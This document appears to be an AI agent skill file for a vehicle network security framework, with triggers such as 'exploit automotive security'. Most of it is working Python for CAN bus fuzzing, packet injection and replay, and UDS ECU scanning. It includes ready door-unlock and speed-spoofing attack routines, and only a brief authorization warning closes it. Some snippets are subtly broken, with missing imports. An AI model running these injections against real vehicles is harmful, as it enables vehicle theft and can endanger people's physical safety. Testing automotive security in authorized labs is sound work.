---
name: s800-vehicle-network-security-testing
description: Framework for testing and analyzing vehicle network security, CAN bus fuzzing, and automotive protocol exploitation
triggers:
  - test vehicle network security
  - analyze CAN bus vulnerabilities
  - fuzz automotive protocols
  - use S800 framework
  - scan vehicle network
  - exploit automotive security
  - test CAN bus security
  - vehicle penetration testing
---

# S800 Vehicle Network Security Testing Framework

> Skill by [ara.so](https://ara.so) — Security Skills collection

S800 is a comprehensive framework for testing and analyzing security vulnerabilities in vehicle networks, with focus on CAN bus, LIN, FlexRay, and other automotive protocols. It provides tools for fuzzing, packet injection, protocol analysis, and vulnerability exploitation in automotive environments.

## Installation

### Prerequisites

```bash
# Install Python dependencies
pip install python-can cantools pyserial

# For hardware interface support
sudo apt-get install can-utils

# Set up SocketCAN (Linux)
sudo modprobe can
sudo modprobe can_raw
sudo modprobe vcan
```

### Clone and Setup

```bash
git clone https://github.com/zhu-zhu666/S800-Vehicle-Network-Security-Testing-Framework.git
cd S800-Vehicle-Network-Security-Testing-Framework
pip install -r requirements.txt
```

### Hardware Setup

```bash
# Set up virtual CAN interface for testing
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Or configure physical CAN interface
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0
```

## Core Components

### 1. CAN Bus Scanner

Scan and identify active CAN IDs on the network:

```python
import can
import time

def scan_can_bus(interface='vcan0', duration=10):
    """Scan CAN bus for active IDs"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    seen_ids = set()
    
    start_time = time.time()
    while time.time() - start_time < duration:
        message = bus.recv(timeout=1.0)
        if message:
            seen_ids.add(message.arbitration_id)
            print(f"ID: 0x{message.arbitration_id:03X} Data: {message.data.hex()}")
    
    bus.shutdown()
    return sorted(seen_ids)

# Usage
active_ids = scan_can_bus('can0', duration=30)
print(f"Found {len(active_ids)} active CAN IDs")
```

### 2. CAN Fuzzer

Fuzz CAN bus messages to discover vulnerabilities:

```python
import can
import random
import itertools

class CANFuzzer:
    def __init__(self, interface='vcan0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    def fuzz_random(self, can_id, count=1000, delay=0.01):
        """Send random data to specified CAN ID"""
        for i in range(count):
            data = bytes([random.randint(0, 255) for _ in range(8)])
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
            self.bus.send(msg)
            time.sleep(delay)
            if i % 100 == 0:
                print(f"Sent {i} fuzzed messages to 0x{can_id:03X}")
    
    def fuzz_incremental(self, can_id, byte_position, start=0, end=255):
        """Fuzz specific byte position incrementally"""
        base_data = [0x00] * 8
        for value in range(start, end + 1):
            base_data[byte_position] = value
            msg = can.Message(arbitration_id=can_id, data=bytes(base_data))
            self.bus.send(msg)
            time.sleep(0.05)
    
    def fuzz_bitflip(self, can_id, original_data):
        """Flip each bit and send message"""
        for byte_idx in range(len(original_data)):
            for bit_idx in range(8):
                data = bytearray(original_data)
                data[byte_idx] ^= (1 << bit_idx)
                msg = can.Message(arbitration_id=can_id, data=bytes(data))
                self.bus.send(msg)
                time.sleep(0.02)
    
    def close(self):
        self.bus.shutdown()

# Usage
fuzzer = CANFuzzer('can0')
# Fuzz door lock CAN ID
fuzzer.fuzz_random(0x2A0, count=500)
# Fuzz specific byte
fuzzer.fuzz_incremental(0x3D0, byte_position=2, start=0, end=100)
fuzzer.close()
```

### 3. Packet Injection

Inject specific CAN packets for exploitation:

```python
import can

class CANInjector:
    def __init__(self, interface='vcan0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    def inject_message(self, can_id, data, extended=False):
        """Inject single CAN message"""
        if isinstance(data, str):
            data = bytes.fromhex(data)
        msg = can.Message(
            arbitration_id=can_id,
            data=data,
            is_extended_id=extended
        )
        self.bus.send(msg)
        print(f"Injected: ID=0x{can_id:03X} Data={data.hex()}")
    
    def inject_sequence(self, messages, interval=0.1):
        """Inject sequence of messages"""
        for can_id, data in messages:
            self.inject_message(can_id, data)
            time.sleep(interval)
    
    def replay_attack(self, can_id, captured_data, repeat=10):
        """Replay captured messages"""
        for i in range(repeat):
            self.inject_message(can_id, captured_data)
            time.sleep(0.1)
    
    def close(self):
        self.bus.shutdown()

# Usage - Door unlock attack
injector = CANInjector('can0')
# Inject door unlock command
injector.inject_message(0x2A0, "0300000000000000")
# Replay captured unlock sequence
unlock_sequence = [
    (0x2A0, "0300000000000000"),
    (0x2B0, "FF00000000000000"),
    (0x2A0, "0100000000000000")
]
injector.inject_sequence(unlock_sequence, interval=0.05)
injector.close()
```

### 4. Protocol Analyzer

Analyze and decode CAN messages:

```python
import can
from collections import defaultdict
import struct

class CANAnalyzer:
    def __init__(self, interface='vcan0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
        self.message_log = defaultdict(list)
    
    def capture(self, duration=60, filter_ids=None):
        """Capture CAN traffic"""
        start_time = time.time()
        print(f"Capturing for {duration} seconds...")
        
        while time.time() - start_time < duration:
            message = self.bus.recv(timeout=1.0)
            if message:
                can_id = message.arbitration_id
                if filter_ids is None or can_id in filter_ids:
                    self.message_log[can_id].append({
                        'timestamp': message.timestamp,
                        'data': message.data
                    })
    
    def analyze_patterns(self, can_id):
        """Analyze patterns in specific CAN ID"""
        if can_id not in self.message_log:
            return None
        
        messages = self.message_log[can_id]
        print(f"\nAnalysis for CAN ID 0x{can_id:03X}:")
        print(f"Total messages: {len(messages)}")
        
        # Find changing bytes
        if len(messages) > 1:
            changing_bytes = set()
            first_data = messages[0]['data']
            for msg in messages[1:]:
                for i, (b1, b2) in enumerate(zip(first_data, msg['data'])):
                    if b1 != b2:
                        changing_bytes.add(i)
            print(f"Changing byte positions: {sorted(changing_bytes)}")
        
        return self.message_log[can_id]
    
    def detect_rpm(self, can_id, byte_positions=[0, 1]):
        """Detect RPM values (example for automotive analysis)"""
        messages = self.message_log.get(can_id, [])
        rpm_values = []
        
        for msg in messages:
            # Common RPM encoding: 2 bytes, little-endian, divide by 4
            if len(msg['data']) >= max(byte_positions) + 1:
                raw = (msg['data'][byte_positions[1]] << 8) | msg['data'][byte_positions[0]]
                rpm = raw / 4.0
                rpm_values.append(rpm)
        
        return rpm_values
    
    def export_log(self, filename):
        """Export captured data"""
        with open(filename, 'w') as f:
            for can_id, messages in self.message_log.items():
                for msg in messages:
                    f.write(f"{msg['timestamp']:.6f},{can_id:03X},{msg['data'].hex()}\n")
    
    def close(self):
        self.bus.shutdown()

# Usage
analyzer = CANAnalyzer('can0')
analyzer.capture(duration=30, filter_ids=[0x201, 0x202, 0x2A0])
analyzer.analyze_patterns(0x201)
analyzer.export_log('can_capture.log')
analyzer.close()
```

### 5. UDS Diagnostic Scanner

Scan for UDS (Unified Diagnostic Services) endpoints:

```python
import can
import time

class UDSScanner:
    def __init__(self, interface='vcan0'):
        self.bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    def scan_ecu_ids(self, start_id=0x700, end_id=0x7FF):
        """Scan for responsive ECU diagnostic IDs"""
        responsive_ecus = []
        
        for ecu_id in range(start_id, end_id + 1):
            # Send diagnostic session control request
            request = can.Message(
                arbitration_id=ecu_id,
                data=[0x02, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]
            )
            self.bus.send(request)
            
            # Wait for response
            response = self.bus.recv(timeout=0.5)
            if response and response.arbitration_id == ecu_id + 8:
                responsive_ecus.append(ecu_id)
                print(f"Found ECU at 0x{ecu_id:03X}")
        
        return responsive_ecus
    
    def read_did(self, ecu_id, did):
        """Read Data Identifier"""
        request = can.Message(
            arbitration_id=ecu_id,
            data=[0x03, 0x22, (did >> 8) & 0xFF, did & 0xFF, 0x00, 0x00, 0x00, 0x00]
        )
        self.bus.send(request)
        
        response = self.bus.recv(timeout=1.0)
        if response:
            return response.data
        return None
    
    def security_access_seed(self, ecu_id, level=0x01):
        """Request security seed"""
        request = can.Message(
            arbitration_id=ecu_id,
            data=[0x02, 0x27, level, 0x00, 0x00, 0x00, 0x00, 0x00]
        )
        self.bus.send(request)
        response = self.bus.recv(timeout=1.0)
        return response.data if response else None
    
    def close(self):
        self.bus.shutdown()

# Usage
uds = UDSScanner('can0')
ecus = uds.scan_ecu_ids(start_id=0x700, end_id=0x710)
for ecu in ecus:
    vin_data = uds.read_did(ecu, 0xF190)  # VIN
    print(f"ECU 0x{ecu:03X} VIN: {vin_data}")
uds.close()
```

## Common Attack Patterns

### Door Unlock Attack

```python
def door_unlock_attack(interface='can0'):
    injector = CANInjector(interface)
    # Common door lock CAN IDs
    door_ids = [0x2A0, 0x3D0, 0x411]
    
    for can_id in door_ids:
        # Try common unlock patterns
        unlock_patterns = [
            "0300000000000000",
            "FF00000000000000",
            "0100FF0000000000"
        ]
        for pattern in unlock_patterns:
            injector.inject_message(can_id, pattern)
            time.sleep(0.5)
    
    injector.close()
```

### Speed Manipulation

```python
def speed_spoofing(interface='can0', target_speed=120):
    injector = CANInjector(interface)
    # Encode speed (common: speed * 100 for two bytes)
    speed_encoded = int(target_speed * 100)
    data = [
        speed_encoded & 0xFF,
        (speed_encoded >> 8) & 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    ]
    
    # Inject continuously
    for _ in range(100):
        injector.inject_message(0x201, bytes(data))
        time.sleep(0.01)
    
    injector.close()
```

## Configuration

### CAN Interface Configuration

```python
# config.py
CAN_CONFIG = {
    'interface': 'can0',
    'bitrate': 500000,
    'bustype': 'socketcan',
    'receive_own_messages': False
}

# Extended CAN
EXTENDED_CAN_CONFIG = {
    'interface': 'can0',
    'bitrate': 500000,
    'bustype': 'socketcan',
    'fd': True,  # CAN FD support
    'data_bitrate': 2000000
}
```

### DBC File Loading

```python
import cantools

def load_dbc(dbc_file):
    """Load vehicle DBC file for message decoding"""
    db = cantools.database.load_file(dbc_file)
    return db

def decode_message(db, can_id, data):
    """Decode CAN message using DBC"""
    try:
        message = db.get_message_by_frame_id(can_id)
        decoded = message.decode(data)
        return decoded
    except KeyError:
        return None

# Usage
db = load_dbc('vehicle.dbc')
decoded = decode_message(db, 0x201, b'\x10\x27\x00\x00\x00\x00\x00\x00')
```

## Troubleshooting

### CAN Interface Not Found

```bash
# Check available interfaces
ip link show

# Restart CAN interface
sudo ip link set can0 down
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up
```

### Permission Denied

```bash
# Add user to dialout group
sudo usermod -a -G dialout $USER

# Or run with sudo (not recommended for production)
sudo python3 scan.py
```

### No Messages Received

```python
# Check if interface is up
import can

try:
    bus = can.interface.Bus(channel='can0', bustype='socketcan')
    bus.set_filters([{"can_id": 0x000, "can_mask": 0x000, "extended": False}])
    print("Interface OK, listening for all messages...")
except Exception as e:
    print(f"Error: {e}")
```

### Bitrate Mismatch

```python
# Auto-detect bitrate (use external tool)
# candump -L can0  # Monitor for errors
# Common automotive bitrates: 125000, 250000, 500000, 1000000

def try_bitrates(interface='can0'):
    bitrates = [125000, 250000, 500000, 1000000]
    for bitrate in bitrates:
        try:
            import subprocess
            subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'type', 'can', 'bitrate', str(bitrate)])
            subprocess.run(['sudo', 'ip', 'link', 'set', 'up', interface])
            print(f"Testing bitrate: {bitrate}")
            time.sleep(2)
        except Exception as e:
            continue
```

## Safety Warnings

Always test in isolated environments. Never perform security testing on production vehicles without authorization. Use virtual CAN interfaces (vcan) for development and testing before connecting to actual vehicle networks.
